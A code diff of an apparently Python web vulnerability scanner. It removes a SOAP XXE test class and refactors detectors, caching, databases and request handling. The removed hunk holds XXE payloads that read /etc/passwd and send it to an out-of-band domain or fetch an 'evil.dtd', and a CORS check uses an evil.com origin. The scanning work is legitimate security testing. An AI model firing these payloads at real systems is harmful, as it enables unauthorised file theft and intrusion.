-        # Use parameter entity for OOB DNS callback
-        xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-    <!ENTITY % data SYSTEM "file://{file_to_exfiltrate}">
-    <!ENTITY % param1 "http://{oob_dns_domain}/%data;">
-    %param1;
-]>
-<root>
-    <test>&xxe;</test>
-</root>"""
-        
-        return xxe_payload
-    
-    @staticmethod
-    async def test_xxe_via_soap(soap_url, oob_dns_domain, file_to_exfiltrate='/etc/passwd', session=None):
-        """
-        Test XXE injection via SOAP endpoint using PUBLIC entity (ASYNC VERSION)
-        """
-        try:
-            import aiohttp
-            
-            xxe_payload = SoapXXEAttack.generate_xxe_payload_public(oob_dns_domain, file_to_exfiltrate)
-            
-            headers = {
-                'Content-Type': 'application/soap+xml; charset=utf-8',
-                'SOAPAction': '"test"'
-            }
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                async with session.post(soap_url, data=xxe_payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    text = await response.text()
-                    
-                    # Check for XXE error indicators
-                    xxe_errors = ['xxe', 'entity', 'external', 'resolution', 'doctype']
-                    has_xxe_error = any(err in text.lower() for err in xxe_errors)
-                    
-                    logging.info(f"SOAP XXE test: Status {response.status}, XXE error: {has_xxe_error}")
-                    
-                    return {
-                        'attack_type': 'XXE via SOAP',
-                        'url': soap_url,
-                        'payload': xxe_payload,
-                        'oob_dns_domain': oob_dns_domain,
-                        'target_file': file_to_exfiltrate,
-                        'response_status': response.status,
-                        'response_text': text[:500],
-                        'has_xxe_error': has_xxe_error,
-                        'vulnerable': not has_xxe_error and response.status not in [400, 403, 500],
-                        'description': 'XXE injection via SOAP using PUBLIC entity to bypass WAF'
-                    }
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"SOAP XXE test failed: {e}")
-            return None
-    
-    @staticmethod
-    async def test_xxe_parameter_entity(soap_url, oob_dns_domain, session=None):
-        """
-        Test XXE using parameter entity for OOB DNS exfiltration (ASYNC VERSION)
-        """
-        try:
-            import aiohttp
-            
-            # Parameter entity payload for OOB DNS
-            xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-    <!ENTITY % xxe SYSTEM "http://{oob_dns_domain}/evil.dtd">
-    %xxe;
-]>
-<root>
-    <test>test</test>
-</root>"""
-            
-            headers = {
-                'Content-Type': 'application/soap+xml; charset=utf-8',
-                'SOAPAction': '"test"'
-            }
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                async with session.post(soap_url, data=xxe_payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    
-                    logging.info(f"SOAP XXE parameter entity test: Status {response.status}")
-                    
-                    return {
-                        'attack_type': 'XXE Parameter Entity',
-                        'url': soap_url,
-                        'payload': xxe_payload,
-                        'oob_dns_domain': oob_dns_domain,
-                        'response_status': response.status,
-                        'vulnerable': response.status not in [400, 403, 500],
-                        'description': 'XXE using parameter entity for OOB DNS exfiltration'
-                    }
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"SOAP XXE parameter entity test failed: {e}")
-            return None
-
-# ---------------------------------------------------------------------
 # UTILITY CLASSES
 # ---------------------------------------------------------------------
 class UserAgentRotator:
@@ -1870,12 +1602,12 @@ class TokenNormalizer:
 class BaselineCache:
     def __init__(self):
         self._cache = {}
-        self.lock = threading.Lock()
-    def get(self, key):
-        with self.lock:
+        self.lock = asyncio.Lock()
+    async def get(self, key):
+        async with self.lock:
             return self._cache.get(key)
-    def set(self, key, val):
-        with self.lock:
+    async def set(self, key, val):
+        async with self.lock:
             self._cache[key] = val
 
 class AsyncRateLimiter:
@@ -1923,7 +1655,16 @@ class AsyncSession:
         )
     async def request(self, method, url, **kwargs):
         async with self.session.request(method, url, **kwargs) as resp:
-            resp._body = await resp.text()
+            # Stream response to avoid OOM on large files; store only first 10KB for evidence
+            body_chunks = []
+            total_size = 0
+            max_evidence_size = 10 * 1024  # 10KB
+            async for chunk in resp.content.iter_chunked(8192):
+                if total_size < max_evidence_size:
+                    body_chunks.append(chunk)
+                    total_size += len(chunk)
+                # Continue consuming stream without storing to avoid OOM
+            resp._body = b''.join(body_chunks).decode('utf-8', errors='ignore')
             return resp
     async def close(self):
         await self.session.close()
@@ -1932,7 +1673,7 @@ class JSRenderDriver:
     def __init__(self, proxy=None):
         self.driver = None
         self.proxy = proxy
-        self.captured_requests = []
+        self.captured_requests = deque(maxlen=1000)  # Prevent memory leak with bounded deque
         self.lock = threading.Lock()
         self.spa_routes_clicked = set()
     
@@ -2090,21 +1831,33 @@ class FP_Database:
         self.c.execute('''CREATE TABLE IF NOT EXISTS false_positives
              (id INTEGER PRIMARY KEY, type TEXT, url TEXT, parameter TEXT, payload TEXT, confidence REAL)''')
         self.conn.commit()
-        self.lock = threading.Lock()
-    def record_fp(self, vuln):
-        with self.lock:
-            self.c.execute("INSERT OR REPLACE INTO false_positives (type, url, parameter, payload, confidence) VALUES (?,?,?,?,?)",
-                          (vuln['type'], vuln['url'], vuln.get('parameter', ''), vuln.get('payload', ''), vuln.get('confidence', 0)))
+        self.lock = asyncio.Lock()
+        self.pending_inserts = []
+        self.batch_size = 100
+    
+    async def record_fp(self, vuln):
+        async with self.lock:
+            self.pending_inserts.append((vuln['type'], vuln['url'], vuln.get('parameter', ''), vuln.get('payload', ''), vuln.get('confidence', 0)))
+            if len(self.pending_inserts) >= self.batch_size:
+                self._flush_batch()
+    
+    def _flush_batch(self):
+        if self.pending_inserts:
+            self.c.executemany("INSERT OR REPLACE INTO false_positives (type, url, parameter, payload, confidence) VALUES (?,?,?,?,?)", self.pending_inserts)
             self.conn.commit()
-    def is_fp(self, vuln):
-        with self.lock:
+            self.pending_inserts.clear()
+    
+    async def is_fp(self, vuln):
+        async with self.lock:
+            self._flush_batch()  # Flush any pending inserts before query
             self.c.execute("SELECT 1 FROM false_positives WHERE type=? AND url=? AND parameter=? AND payload=?",
                           (vuln['type'], vuln['url'], vuln.get('parameter', ''), vuln.get('payload', '')))
             return self.c.fetchone() is not None
     
-    def close(self):
+    async def close(self):
         """Close the database connection"""
-        with self.lock:
+        async with self.lock:
+            self._flush_batch()  # Flush any pending inserts before closing
             if self.conn:
                 self.conn.close()
 
@@ -2145,6 +1898,8 @@ class ScanStateManager:
         self.c = self.conn.cursor()
         self._init_tables()
         self.lock = threading.Lock()
+        self.pending_page_inserts = []
+        self.batch_size = 100
     
     def _init_tables(self):
         self.c.execute('''CREATE TABLE IF NOT EXISTS scan_state
@@ -2152,7 +1907,12 @@ class ScanStateManager:
               visited_urls TEXT, parameters TEXT, vulnerabilities TEXT,
               crawled_pages TEXT, config TEXT)''')
         self.c.execute('''CREATE TABLE IF NOT EXISTS page_hashes
-             (url TEXT PRIMARY KEY, content_hash TEXT, metadata TEXT, timestamp TEXT)''')
+             (url TEXT PRIMARY KEY, content_hash TEXT, metadata TEXT, html_content TEXT, timestamp TEXT)''')
+        # Add html_content column if it doesn't exist (for backward compatibility)
+        try:
+            self.c.execute("ALTER TABLE page_hashes ADD COLUMN html_content TEXT")
+        except sqlite3.OperationalError:
+            pass  # Column already exists
         self.conn.commit()
     
     def save_state(self, target, visited_urls, parameters, vulnerabilities, crawled_pages, config):
@@ -2167,31 +1927,61 @@ class ScanStateManager:
             self.c.execute("SELECT target, visited_urls, parameters, vulnerabilities, crawled_pages, config FROM scan_state WHERE id=1")
             row = self.c.fetchone()
             if row:
-                parameters = json.loads(row[2]) if row[2] else []
-                vulnerabilities = json.loads(row[3]) if row[3] else []
+                try:
+                    parameters = json.loads(row[2]) if row[2] else []
+                except json.JSONDecodeError:
+                    parameters = []
+                try:
+                    vulnerabilities = json.loads(row[3]) if row[3] else []
+                except json.JSONDecodeError:
+                    vulnerabilities = []
+                try:
+                    visited_urls = set(json.loads(row[1])) if row[1] else set()
+                except json.JSONDecodeError:
+                    visited_urls = set()
+                try:
+                    crawled_pages = json.loads(row[4]) if row[4] else []
+                except json.JSONDecodeError:
+                    crawled_pages = []
+                try:
+                    config = json.loads(row[5]) if row[5] else {}
+                except json.JSONDecodeError:
+                    config = {}
+                    
                 return {
                     'target': row[0],
-                    'visited_urls': set(json.loads(row[1])) if row[1] else set(),
+                    'visited_urls': visited_urls,
                     'parameters': parameters if isinstance(parameters, list) else [],
                     'vulnerabilities': vulnerabilities if isinstance(vulnerabilities, list) else [],
-                    'crawled_pages': json.loads(row[4]) if row[4] else [],
-                    'config': json.loads(row[5]) if row[5] else {}
+                    'crawled_pages': crawled_pages,
+                    'config': config
                 }
             return None
     
     def store_page_hash(self, url, content, metadata):
         with self.lock:
             content_hash = hashlib.sha256(content.encode()).hexdigest()
-            self.c.execute("INSERT OR REPLACE INTO page_hashes (url, content_hash, metadata, timestamp) VALUES (?, ?, ?, ?)",
-                          (url, content_hash, json.dumps(metadata), datetime.now().isoformat()))
+            self.pending_page_inserts.append((url, content_hash, json.dumps(metadata), content, datetime.now().isoformat()))
+            if len(self.pending_page_inserts) >= self.batch_size:
+                self._flush_page_batch()
+    
+    def _flush_page_batch(self):
+        if self.pending_page_inserts:
+            self.c.executemany("INSERT OR REPLACE INTO page_hashes (url, content_hash, metadata, html_content, timestamp) VALUES (?, ?, ?, ?, ?)", self.pending_page_inserts)
             self.conn.commit()
+            self.pending_page_inserts.clear()
     
     def get_page_hash(self, url):
         with self.lock:
-            self.c.execute("SELECT content_hash, metadata FROM page_hashes WHERE url=?", (url,))
+            self._flush_page_batch()  # Flush any pending inserts before query
+            self.c.execute("SELECT content_hash, metadata, html_content FROM page_hashes WHERE url=?", (url,))
             row = self.c.fetchone()
             if row:
-                return {'hash': row[0], 'metadata': json.loads(row[1])}
+                try:
+                    metadata = json.loads(row[1])
+                except json.JSONDecodeError:
+                    metadata = {}
+                return {'hash': row[0], 'metadata': metadata, 'html_content': row[2]}
             return None
     
     def clear_state(self):
@@ -2268,7 +2058,13 @@ class MITMProxyHandler:
                                 text = await resp.text()
                                 return resp.status, dict(resp.headers), content, text
                     
-                    status_code, resp_headers, content, text = asyncio.run(forward_request())
+                    # Use new_event_loop instead of asyncio.run() to avoid issues in BaseHTTPRequestHandler thread
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    try:
+                        status_code, resp_headers, content, text = loop.run_until_complete(forward_request())
+                    finally:
+                        loop.close()
                     
                     # Send response
                     self.send_response(status_code)
@@ -2597,7 +2393,7 @@ class ValidationEngine:
             if 'XSS' in vuln_type:
                 is_present = payload in html
             elif 'SQLi' in vuln_type:
-                is_present = SQL_ERROR_PATTERN.search(html) is not None
+                is_present = detect_sqli_error_ast(html)
             else:
                 is_present = True  # Default to present for other types
             
@@ -2646,7 +2442,7 @@ class ValidationEngine:
                     xss_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'onmouseover=']
                     is_present = any(indicator in html.lower() for indicator in xss_indicators)
                 elif 'SQLi' in vuln_type:
-                    is_present = SQL_ERROR_PATTERN.search(html) is not None
+                    is_present = detect_sqli_error_ast(html)
                 else:
                     is_present = True
                 
@@ -2805,7 +2601,7 @@ class ValidationEngine:
                         }
                     
                     # Check if query executed successfully (no error)
-                    if status == 200 and not SQL_ERROR_PATTERN.search(html):
+                    if status == 200 and not detect_sqli_error_ast(html):
                         return {
                             'stacked_query_successful': True,
                             'payload_used': stacked_payload,
@@ -2930,7 +2726,7 @@ class Detector:
         return {"type":"XSS","confidence":confidence,"evidence":Detector._extract(html,payload)}
 
     @staticmethod
-    def dom_xss(url, driver, oob_marker, oob_url):
+    async def dom_xss(url, driver, oob_marker, oob_url):
         if not driver: return None
         script = f"""
         (function(){{
@@ -2940,7 +2736,7 @@ class Detector:
         }})();
         """
         driver.execute_js(script)
-        time.sleep(1.5)
+        await asyncio.sleep(1.5)
         with oob_results_lock:
             for res in oob_results:
                 if oob_marker in res['path']:
@@ -2956,17 +2752,17 @@ class Detector:
         return None
 
     @staticmethod
-    def sqli(html, baseline_html, resp_time=None, baseline_time=None):
-        if SQL_ERROR_PATTERN.search(html):
-            if baseline_html and SQL_ERROR_PATTERN.search(baseline_html):
-                return {"type":"SQLi (Error)","confidence":40,"evidence":Detector._extract(html,SQL_ERROR_PATTERN)}
-            return {"type":"SQLi (Error)","confidence":85,"evidence":Detector._extract(html,SQL_ERROR_PATTERN)}
+    def sqli(html: str, baseline_html: Optional[str], resp_time: Optional[float] = None, baseline_time: Optional[float] = None) -> Optional[Dict[str, Any]]:
+        if detect_sqli_error_ast(html):
+            if baseline_html and detect_sqli_error_ast(baseline_html):
+                return {"type":"SQLi (Error)","confidence":40,"evidence":"SQL error detected via AST analysis"}
+            return {"type":"SQLi (Error)","confidence":85,"evidence":"SQL error detected via AST analysis"}
         if resp_time and baseline_time and resp_time > baseline_time * 1.5:
             return {"type":"SQLi (Time-based)","confidence":75,"evidence":f"Response {resp_time:.1f}s vs baseline {baseline_time:.1f}s"}
         return None
 
     @staticmethod
-    def sqli_union(html, order_test_results, unique_marker):
+    def sqli_union(html: str, order_test_results: List[Tuple[int, int]], unique_marker: str) -> Optional[Dict[str, Any]]:
         for num, diff in order_test_results:
             if diff > 0:
                 nulls = ','.join(['NULL']*(num-1))
@@ -2975,13 +2771,13 @@ class Detector:
         return None
 
     @staticmethod
-    def sqli_boolean(resp_true, resp_false):
+    def sqli_boolean(resp_true: Any, resp_false: Any) -> Optional[Dict[str, Any]]:
         if resp_true.status_code != resp_false.status_code or len(resp_true.text) != len(resp_false.text):
             return {"type":"SQLi (Boolean)","confidence":85,"evidence":"Different TRUE/FALSE responses"}
         return None
 
     @staticmethod
-    def baseline_shotgun_sqli(resp_legit, resp_false, resp_true):
+    def baseline_shotgun_sqli(resp_legit: Optional[Any], resp_false: Optional[Any], resp_true: Optional[Any]) -> Optional[Dict[str, Any]]:
         """
         Baseline shotgun SQLi detection:
         - Send legitimate request to establish baseline
@@ -3021,7 +2817,7 @@ class Detector:
         return None
 
     @staticmethod
-    def nosql_operator_injection(resp_baseline, resp_gt, resp_regex):
+    def nosql_operator_injection(resp_baseline: Optional[Any], resp_gt: Optional[Any], resp_regex: Optional[Any]) -> List[Dict[str, Any]]:
         """
         NoSQL operator injection detection for MongoDB:
         - Replace parameter with {"$gt": ""} to see if it returns all users
@@ -3072,45 +2868,50 @@ class Detector:
         return vulns if vulns else None
 
     @staticmethod
-    def small_difference_detection(html1, html2, context=""):
+    def small_difference_detection(html1: str, html2: str, context: str = "") -> List[str]:
         """
-        Small difference detection (STRICT MODE to reduce false positives):
+        Small difference detection (DETERMINISTIC MODE using structural diff):
         - Only flag CRITICAL security-relevant differences
         - Look for differences in JSON keys like "isAdmin": false vs "isAdmin": true
         - Look for differences in hidden HTML input fields
         - If a minor parameter change flips a boolean flag, escalate it
-        - IGNORE: timestamp changes, session IDs, CSRF tokens, nonces
+        - Uses exact key matching (not regex) to avoid false negatives on keys like "admin_timestamp"
         """
         import json
         import re
         
         differences = []
         
-        # Patterns to IGNORE (non-security-relevant changes)
-        ignore_patterns = [
-            r'timestamp', r'created_at', r'updated_at', r'date', r'time',
-            r'session[_-]?id', r'sess[_-]?id', r'csrf[_-]?token', r'nonce',
-            r'_token', r'auth[_-]?token', r'jwt', r'exp', r'iat',
-            r'request[_-]?id', r'trace[_-]?id', r'correlation[_-]?id',
-            r'uuid', r'guid', r'id$', r'version', r'etag'
-        ]
+        # EXACT keys to IGNORE (non-security-relevant changes) - using exact match, not regex
+        IGNORE_KEYS_EXACT = {
+            'timestamp', 'created_at', 'updated_at', 'date', 'time',
+            'session_id', 'sess_id', 'csrf_token', 'nonce',
+            '_token', 'auth_token', 'jwt', 'exp', 'iat',
+            'request_id', 'trace_id', 'correlation_id',
+            'uuid', 'guid', 'version', 'etag'
+        }
         
         def should_ignore_key(key):
-            """Check if key should be ignored (non-security-relevant)"""
+            """Check if key should be ignored (non-security-relevant) - EXACT match only"""
             key_lower = key.lower()
-            return any(re.search(pattern, key_lower, re.IGNORECASE) for pattern in ignore_patterns)
+            return key_lower in IGNORE_KEYS_EXACT
         
         # Try to parse as JSON
         try:
             json1 = json.loads(html1) if html1 else {}
             json2 = json.loads(html2) if html2 else {}
-            
-            # Compare JSON structures recursively
+        except json.JSONDecodeError:
+            # If not JSON, fall back to text comparison
+            json1 = None
+            json2 = None
+        
+        if json1 is not None and json2 is not None:
+            # Compare JSON structures recursively using structural diff
             def compare_json(obj1, obj2, path=""):
                 if isinstance(obj1, dict) and isinstance(obj2, dict):
                     all_keys = set(obj1.keys()) | set(obj2.keys())
                     for key in all_keys:
-                        # Skip ignored keys
+                        # Skip ignored keys (exact match only)
                         if should_ignore_key(key):
                             continue
                             
@@ -3137,8 +2938,7 @@ class Detector:
                         differences.append(f"Array length changed at {path}: {len(obj1)} vs {len(obj2)}")
             
             compare_json(json1, json2)
-            
-        except (json.JSONDecodeError, ValueError):
+        else:
             # Not JSON, check HTML for hidden fields
             hidden_pattern = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>', re.IGNORECASE)
             hidden1 = hidden_pattern.findall(html1) if html1 else []
@@ -3182,7 +2982,7 @@ class Detector:
         return None
 
     @staticmethod
-    def path_traversal(html, baseline_html):
+    def path_traversal(html: str, baseline_html: Optional[str]) -> Optional[Dict[str, Any]]:
         if PASSWD_PATTERN.search(html):
             if baseline_html and PASSWD_PATTERN.search(baseline_html): return None
             return {"type":"PathTraversal","confidence":92,"evidence":Detector._extract(html,PASSWD_PATTERN)}
@@ -3207,7 +3007,7 @@ class Detector:
         return None
 
     @staticmethod
-    def ssti(html, payload, baseline_html):
+    def ssti(html: str, payload: str, baseline_html: Optional[str]) -> Optional[Dict[str, Any]]:
         if "49" in html and "7*7" in payload:
             if baseline_html and "49" in baseline_html: return None
             return {"type":"SSTI","confidence":90,"evidence":"49 (7*7)"}
@@ -3221,14 +3021,14 @@ class Detector:
         return None
 
     @staticmethod
-    def crlf(resp, baseline_resp):
+    def crlf(resp: Any, baseline_resp: Optional[Any]) -> Optional[Dict[str, Any]]:
         if 'X-Custom' in resp.headers or 'crlf' in resp.text.lower():
             if baseline_resp and ('X-Custom' in baseline_resp.headers or 'crlf' in baseline_resp.text.lower()): return None
             return {"type":"CRLF","confidence":70,"evidence":"Header injection"}
         return None
 
     @staticmethod
-    def ssrf(html, baseline_html, payload, oob_results, sent_marker):
+    def ssrf(html: str, baseline_html: Optional[str], payload: str, oob_results: List[Dict[str, Any]], sent_marker: str) -> Optional[Dict[str, Any]]:
         if AWS_META_PATTERN.search(html):
             if baseline_html and AWS_META_PATTERN.search(baseline_html): return None
             return {"type":"SSRF (AWS)","confidence":90,"evidence":Detector._extract(html,AWS_META_PATTERN)}
@@ -3249,7 +3049,7 @@ class Detector:
         return None
 
     @staticmethod
-    def ldapi(html, baseline_html, payload):
+    def ldapi(html: str, baseline_html: Optional[str], payload: str) -> Optional[Dict[str, Any]]:
         if "uid=" in html.lower() and "*" in payload:
             if baseline_html and "uid=" in baseline_html.lower(): return None
             return {"type":"LDAPi","confidence":70,"evidence":"Filter bypass"}
@@ -3266,7 +3066,7 @@ class Detector:
         return None
 
     @staticmethod
-    def cors_misconfig(url, session, selenium_available=False):
+    def cors_misconfig(url: str, session: Any, selenium_available: bool = False) -> Optional[Dict[str, Any]]:
         test_origin = "https://evil.com"
         headers = {"Origin": test_origin}
         try:
@@ -3296,7 +3096,7 @@ class Detector:
         return None
 
     @staticmethod
-    def jwt_test(token, public_key=None):
+    def jwt_test(token: str, public_key: Optional[str] = None) -> List[Dict[str, Any]]:
         vulns = []
         try:
             decoded = pyjwt.decode(token, options={"verify_signature": False})
@@ -3383,7 +3183,7 @@ class Detector:
         return None
 
     @staticmethod
-    def log_injection(html, baseline_html, payload):
+    def log_injection(html: str, baseline_html: Optional[str], payload: str) -> Optional[Dict[str, Any]]:
         if "INJECTED" in html and "%0d%0a" in payload:
             if baseline_html and "INJECTED" in baseline_html: return None
             return {"type":"LogInjection","confidence":80,"evidence":"Log entry reflected"}
@@ -3414,7 +3214,7 @@ class Detector:
         return None
 
     @staticmethod
-    def put_resource_overwrite(resp, baseline_resp, url):
+    def put_resource_overwrite(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
         """Detect PUT method resource overwrite vulnerabilities"""
         if resp.status == 200 or resp.status == 204:
             # Check if resource was overwritten without proper authorization
@@ -3443,7 +3243,7 @@ class Detector:
         return None
 
     @staticmethod
-    def patch_validation_bypass(resp, baseline_resp, payload):
+    def patch_validation_bypass(resp: Any, baseline_resp: Optional[Any], payload: str) -> Optional[Dict[str, Any]]:
         """Detect PATCH method validation bypass"""
         # Handle both sync (requests) and async (aiohttp) responses
         resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
@@ -3459,7 +3259,7 @@ class Detector:
         return None
 
     @staticmethod
-    def post_stored_xss(resp, baseline_resp, payload, oob_results, marker):
+    def post_stored_xss(resp: Any, baseline_resp: Optional[Any], payload: str, oob_results: List[Dict[str, Any]], marker: str) -> Optional[Dict[str, Any]]:
         """Detect POST method stored XSS vulnerabilities"""
         # Handle both sync (requests) and async (aiohttp) responses
         resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
@@ -3478,7 +3278,7 @@ class Detector:
         return None
 
     @staticmethod
-    def post_auth_bypass(resp, baseline_resp, url):
+    def post_auth_bypass(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
         """Detect POST method authentication bypass"""
         # Handle both sync (requests) and async (aiohttp) responses
         resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
@@ -3493,7 +3293,7 @@ class Detector:
         return None
 
     @staticmethod
-    def post_command_injection(resp, baseline_resp, payload):
+    def post_command_injection(resp: Any, baseline_resp: Optional[Any], payload: str) -> Optional[Dict[str, Any]]:
         """Detect POST method command injection"""
         # Handle both sync (requests) and async (aiohttp) responses
         resp_text = resp._body if hasattr(resp, '_body') else (resp.text if isinstance(resp.text, str) else resp.text())
@@ -3525,7 +3325,7 @@ class Detector:
         return None
 
     @staticmethod
-    def get_parameter_pollution(resp, baseline_resp, url):
+    def get_parameter_pollution(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
         """Detect GET method parameter pollution"""
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
@@ -3537,7 +3337,7 @@ class Detector:
         return None
 
     @staticmethod
-    def get_cache_poisoning(resp, baseline_resp, url):
+    def get_cache_poisoning(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
         """Detect GET method cache poisoning"""
         cache_headers = ['X-Cache', 'X-Cache-Hit', 'X-Cache-Lookup', 'Age', 'CF-Cache-Status']
         if any(header in resp.headers for header in cache_headers):
@@ -3547,7 +3347,7 @@ class Detector:
         return None
 
     @staticmethod
-    def delete_unauthorized(resp, baseline_resp, url):
+    def delete_unauthorized(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
         """Detect DELETE method unauthorized deletion"""
         if resp.status == 200 or resp.status == 204:
             # Check for successful deletion without proper authorization
@@ -3569,7 +3369,7 @@ class Detector:
         return None
 
     @staticmethod
-    def delete_cascading(resp, baseline_resp, url):
+    def delete_cascading(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
         """Detect DELETE method cascading deletion"""
         if resp.status == 200:
             # Check for cascading deletion indicators
@@ -3579,7 +3379,7 @@ class Detector:
         return None
 
     @staticmethod
-    def options_info_disclosure(resp, baseline_resp, url):
+    def options_info_disclosure(resp: Any, baseline_resp: Optional[Any], url: str) -> Optional[Dict[str, Any]]:
         """Detect OPTIONS method information disclosure"""
         allow_header = resp.headers.get('Allow', '')
         if allow_header:
@@ -3607,7 +3407,7 @@ class Detector:
         return None
 
     @staticmethod
-    def _extract(text, pattern, window=120):
+    def _extract(text: str, pattern: Union[str, Pattern], window: int = 120) -> str:
         if isinstance(pattern, str):
             idx = text.find(pattern)
         else:
@@ -3619,361 +3419,77 @@ class Detector:
         return text[start:end].strip()
 
 # ---------------------------------------------------------------------
-# CORE SCANNER ENGINE (async)
+# CIRCUIT BREAKER FOR HTTP REQUESTS
 # ---------------------------------------------------------------------
-class OmegaDAST:
-    def __init__(self, target, config, signals, loop=None):
-        self.target = target.rstrip('/')
-        self.base_domain = urlparse(target).netloc
-        self.config = config
-        self.signals = signals
-        self.loop = loop or asyncio.new_event_loop()
-        self.async_session = None
-        self.rate_limiter = AsyncRateLimiter(config.get('delay', DEFAULT_DELAY))
-        self.selenium_driver = None
-        self.baseline_cache = BaselineCache()
-        self.token_normalizer = TokenNormalizer()
-        self.oob_server = None
-        self.oob_port = None
-        self.oob_dns_ip = config.get('oob_dns_ip')
-        self.oob_dns_domain = config.get('oob_dns_domain', 'oob.example.com')
-        self.public_ip = config.get('oob_ip') or get_public_ip()
-        
-        # Validate OOB configuration before scan starts
-        if not validate_oob_config(self.public_ip, self.oob_dns_domain):
-            logging.warning("OOB configuration validation failed. Scan may have issues with OOB callbacks.")
-        self.oob_marker_base = uuid.uuid4().hex[:8]
-        self.exclusion_patterns = [re.compile(p) for p in config.get('exclude', [])]
-        self.capture_evidence = config.get('capture_evidence', True)
-        self.fp_db = FP_Database()
-        self.secondary_session = None
-        self.visited_urls = set()
-        self.crawled_pages = []
-        self.parameters = []
-        self.vulnerabilities = []
-        self.stop_event = asyncio.Event()
-        self.selenium_ready = False
-        self.log_file = config.get('log_file')
-        # Concurrency limit to prevent overwhelming targets
-        self.concurrency_limit = config.get('concurrency_limit', 100)
-        self.semaphore = asyncio.Semaphore(self.concurrency_limit)
-        # New features
-        self.proxy_rotator = ProxyRotator(config.get('proxy_list'))
-        self.scan_state_manager = ScanStateManager(config.get('state_db', 'scan_state.db'))
-        self.temporal_recheck_enabled = config.get('temporal_recheck', False)
-        self.recheck_delay = config.get('recheck_delay', 3600)  # 1 hour default
-        self.validation_tasks = set()  # Store validation tasks to prevent garbage collection
-        self.memory_efficient = config.get('memory_efficient', True)
-        self.vulnerability_timestamps = {}  # Track when vulnerabilities were first found
-        
-        # Validation Engine for 3x validation and remediation testing
-        self.validation_enabled = config.get('validation_enabled', DEFAULT_VALIDATION_ENABLED)
-        self.validation_engine = None  # Will be initialized in setup() with async session
-        
-        # Advanced OOB servers
-        self.smtp_oob_handler = None
-        self.icmp_oob_listener = None
-        self.https_oob_server = None
-        self.https_oob_port = None
-        self.enable_advanced_oob = config.get('enable_advanced_oob', False)
-        # logging setup with rotation
-        log_file = self.log_file or 'ultradast.log'
-        log_handler = RotatingFileHandler(
-            log_file,
-            maxBytes=10*1024*1024,  # 10MB
-            backupCount=5,
-            encoding='utf-8'
-        )
-        log_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-        logging.basicConfig(
-            level=logging.INFO,
-            handlers=[log_handler, logging.StreamHandler()],
-            format='%(asctime)s - %(levelname)s - %(message)s'
-        )
+class CircuitBreaker:
+    """Circuit breaker with failure threshold and exponential backoff"""
 
-    def log(self, msg):
-        """Log message - can be overridden by GUI or use default logging"""
-        if hasattr(self.signals, 'log'):
-            self.signals.log.emit(msg)
-        else:
-            logging.info(msg)
+    def __init__(self, failure_threshold: int = 5, cooldown: int = 60, max_retries: int = 3) -> None:
+        self.failure_threshold = failure_threshold
+        self.cooldown = cooldown  # seconds
+        self.max_retries = max_retries
+        self.failure_count = 0
+        self.last_failure_time: Optional[float] = None
+        self.state = 'closed'  # closed, open, half-open
+        self.lock = threading.Lock()
 
-    def add_finding(self, vuln):
-        """Report vulnerability finding - can be overridden by GUI or use default logging"""
-        if hasattr(self.signals, 'finding'):
-            self.signals.finding.emit(vuln)
-        else:
-            logging.info(f"Finding: {vuln}")
+    def record_failure(self) -> None:
+        """Record a failure and potentially open the circuit"""
+        with self.lock:
+            self.failure_count += 1
+            self.last_failure_time = time.time()
+            if self.failure_count >= self.failure_threshold:
+                self.state = 'open'
+                logging.warning(f"Circuit breaker opened after {self.failure_count} failures")
     
-    def update_progress(self, current, total):
-        """Update progress - can be overridden by GUI or use default logging"""
-        if hasattr(self.signals, 'progress'):
-            self.signals.progress.emit(current, total)
-        else:
-            logging.info(f"Progress: {current}/{total}")
+    def record_success(self) -> None:
+        """Record a success and potentially close the circuit"""
+        with self.lock:
+            self.failure_count = max(0, self.failure_count - 1)
+            if self.state == 'half-open':
+                self.state = 'closed'
+                logging.info("Circuit breaker closed after successful request")
+            elif self.failure_count == 0:
+                self.state = 'closed'
 
-    async def setup(self):
-        self.oob_server, self.oob_port = start_oob_server()
-        self.log(f"OOB HTTP: {self.public_ip}:{self.oob_port}")
-        
-        # Start advanced OOB servers if enabled
-        if self.enable_advanced_oob:
-            # SMTP OOB server
-            self.smtp_oob_handler = SMTPOOBHandler()
-            if self.smtp_oob_handler.start():
-                self.log("SMTP OOB server started on port 2525")
-            
-            # ICMP OOB listener (requires admin)
-            self.icmp_oob_listener = ICMPOOBListener()
-            if self.icmp_oob_listener.start():
-                self.log("ICMP OOB listener started")
-            
-            # HTTPS OOB server
-            self.https_oob_server, self.https_oob_port = start_https_oob_server()
-            if self.https_oob_server:
-                self.log(f"OOB HTTPS: {self.public_ip}:{self.https_oob_port}")
-        
-        # Load previous state if resuming
-        if self.config.get('resume_scan'):
-            prev_state = self.scan_state_manager.load_state()
-            if prev_state and prev_state['target'] == self.target:
-                self.visited_urls = prev_state['visited_urls']
-                self.parameters = prev_state['parameters'] if isinstance(prev_state['parameters'], list) else []
